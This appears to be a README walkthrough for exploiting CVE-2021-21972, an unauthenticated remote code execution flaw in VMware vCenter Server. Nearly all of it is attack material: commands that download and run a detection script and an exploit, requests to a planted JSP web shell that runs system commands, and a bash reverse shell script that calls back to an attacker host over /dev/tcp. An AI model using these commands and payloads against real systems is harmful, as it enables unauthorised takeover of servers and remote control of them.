# Exploit Title: VMware vCenter Server RCE 6.5 / 6.7 / 7.0 - Remote Code Execution (RCE) (Unauthenticated)
## CVE-2021-21972 Exploit

## Recon:
```
root@kali:/chacka0101/CVE-2021-21972# wget https://raw.githubusercontent.com/chacka0101/exploits/master/CVE-2021-21972/CVE-2021-21972.nse
root@kali:/chacka0101/CVE-2021-21972# cp CVE-2021-21972.nse /usr/share/nmap/scripts/
```
![](https://github.com/chacka0101/exploits/blob/master/CVE-2021-21972/Recon1.png?raw=true)
```
root@kali:/chacka0101/CVE-2021-21972# nmap --script CVE-2021-21972 XXX.XXX.XXX.XXX
```
![](https://github.com/chacka0101/exploits/blob/master/CVE-2021-21972/Recon4.png?raw=true)
```
Thank you!!! Alex Hernandez aka (@_alt3kx_)
```
## VULN. SCAN:
![](https://github.com/chacka0101/exploits/blob/master/CVE-2021-21972/Vuln.png?raw=true)

## Banner VMware vCenter Server:
![](https://github.com/chacka0101/exploits/blob/master/CVE-2021-21972/Banner443.png?raw=true)

## Download exploit：
```
root@kali:/chacka0101/CVE-2021-21972# wget https://raw.githubusercontent.com/chacka0101/exploits/master/CVE-2021-21972/CVE-2021-21972-exploit.py
```
![](https://github.com/chacka0101/exploits/blob/master/CVE-2021-21972/DownloadExploit.png?raw=true)

## Exec exploit with python2：
```
root@kali:/chacka0101/CVE-2021-21972# python2 CVE-2021-21972-exploit.py --target XXX.XXX.XXX.XXX --local XXX.XXX.XXX.XXX
```
![](https://github.com/chacka0101/exploits/blob/master/CVE-2021-21972/Exploit3.png?raw=true)

## NOTE: Upload two files, shell4.js and reverse.sh:
```
https://XXX.XXX.XXXX/ui/resources/shell4.jsp?cmd=id
```
![](https://github.com/chacka0101/exploits/blob/master/CVE-2021-21972/shell4.png?raw=true)
```
https://XXX.XXX.XXXX/ui/resources/shell4.jsp?cmd=ls+%2Ftmp
```
![](https://github.com/chacka0101/exploits/blob/master/CVE-2021-21972/Reverse.png?raw=true)
```
reverse.sh
----
#!/bin/bash

bash -i >& /dev/tcp/XXX.XXX.XXX.XXX/443 0>&1
----
```
--------------------------------------------------------
```
Research credit to: @Mikhail Klyuchnikov, @horizon3ai, @diegoexploit, @DesertH4wk and @_alt3kx_.
```
